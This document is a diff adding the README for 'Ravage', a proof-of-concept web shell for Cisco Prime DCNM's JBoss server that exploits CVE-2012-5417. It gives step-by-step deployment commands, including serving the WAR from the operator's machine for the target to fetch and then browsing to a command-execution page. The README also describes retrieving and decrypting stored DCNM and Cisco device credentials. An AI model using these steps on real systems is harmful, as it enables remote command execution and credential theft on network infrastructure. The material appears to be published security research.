@@ -1,0 +1,80 @@
+License
+-----------------
+Ravage is released under the GNU GPLv3, a copy of which should be included in
+this distribution.
+
+About
+-----------------
+Ravage is a Proof of Concept utility shell that can be deployed on JBoss instances in versions of Cisco Prime Data Center Network Manager between 4.1 and 6.1.1b by means of CVE-2012-5417. It can be used to execute commands like a traditional WAR shell, issue database queries where the instance has been configured with the default postgres database, and retrieve and decrypt DCNM application and Cisco device credentials due to the use of a static password used as part of a PBE scheme.
+
+Ravage has been confirmed working against default installations of Cisco Prime DCNM 4.1 through 6.1.1b.
+
+Ravage is brought to you by Security Compass and Paul O'Grady
+Please direct enquiries to paul@securitycompass.com (@3v0lver)
+
+
+Basic Usage:
+-----------------
+The following instructions are for deploying the prepackaged tool, Ravage.war using RMI and the twiddle.sh utility packaged with JBoss
+
+
+1)Download and unpack a version of JBoss (jboss-4.2.3.GA)
+
+2)Copy the Ravage utility to [JBoss Version]/bin
+
+3)Change directories to [JBoss Version]/bin/Ravage
+
+4)Temporarily host Ravage.war over HTTP using: python -m SimpleHTTPServer 8111 &
+
+5)Execute: ./deploy.sh [Local IP] [Target IP] Ravage.war
+
+6)A successful deployment should return a response similar to the following:
+
+	jboss.web.deployment:war=dcnm-client.war,id=-16653988
+	jboss.web.deployment:war=juddi.war,id=-708919957
+	jboss.web.deployment:war=invoker.war,id=-1202582309
+	jboss.web.deployment:war=Ravage.war,id=1092290499 		<<<<<<<<<<<<
+	jboss.web.deployment:war=web-console.war,id=-653617
+	jboss.web.deployment:war=dcnm-ws-server.war,id=-1654018464
+	jboss.web.deployment:war=jbossws-context.war,id=-113999545
+	jboss.web.deployment:war=jmx-console.war,id=-708931753
+	jboss.web.deployment:war=ROOT.war,id=487788169
+
+7)Terminate the SimpleHTTPServer instance 
+
+8)Using your browser navigate to: http://[Target IP]:8080/Ravage/cmd.jsp
+
+Compiling and deploying Ravage from source:
+-----------------
+
+1)Follow steps 1 and 2, above
+
+2)Navigate to: [JBoss Version]/bin/Ravage/payload/WEB-INF/classes/dcnmWork
+
+3)Ensure your classpath is correctly set
+
+4)Execute: javac *.java
+
+5)Navigate to: [JBoss Version]/bin/Ravage/payload
+
+6)Create a WAR package by executing: jar -cvf ../[arbitrary name.war] .
+
+7)Follow steps 3-8, substituting the filename you chose above in place of "Ravage.war" 
+
+The utility can be removed by issuing the following commands:
+
+twiddle.sh -s [Target IP] invoke jboss.system:service=MainDeployer undeploy http://[Local IP]:8111/[arbitrary name.war]
+
+Issues:
+-----------------
+The current PoC assumes installation defaults, as a result the tool will not be able to find the batch file containing the database credentials if it is in a non-standard location 
+
+
+TODO:
+-----------------
+[-]Automatic detection of DCNM installation directory
+...
+
+
+
+
